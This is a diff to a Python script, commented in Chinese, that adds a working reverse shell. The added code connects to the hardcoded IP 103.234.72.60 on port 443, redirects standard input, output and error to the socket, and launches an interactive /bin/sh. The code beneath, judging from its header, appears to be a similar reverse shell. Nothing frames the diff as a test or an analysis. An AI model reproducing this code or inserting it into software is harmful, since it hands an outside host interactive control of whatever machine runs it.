@@ -1,4 +1,33 @@
 #!/usr/bin/python
+import sys, os, socket, pty
+
+# 手动指定目标主机和端口
+target_host = "103.234.72.60"
+target_port = 443
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target_host, target_port))
+#s.connect((sys.argv[1], int(sys.argv[2]))
+
+# 使用os.dup2将socket连接绑定到标准输入、输出和错误
+os.dup2(s.fileno(), 0)  # 标准输入
+os.dup2(s.fileno(), 1)  # 标准输出
+os.dup2(s.fileno(), 2)  # 标准错误
+
+# 使用pty.spawn来执行Shell
+import subprocess
+subprocess.call(["/bin/sh", "-i"])
+
+
+
+
+
+
+
+
+
+
+#!/usr/bin/python
 # 
 import sys,os,socket,pty
 # 目标主机的IP地址和端口
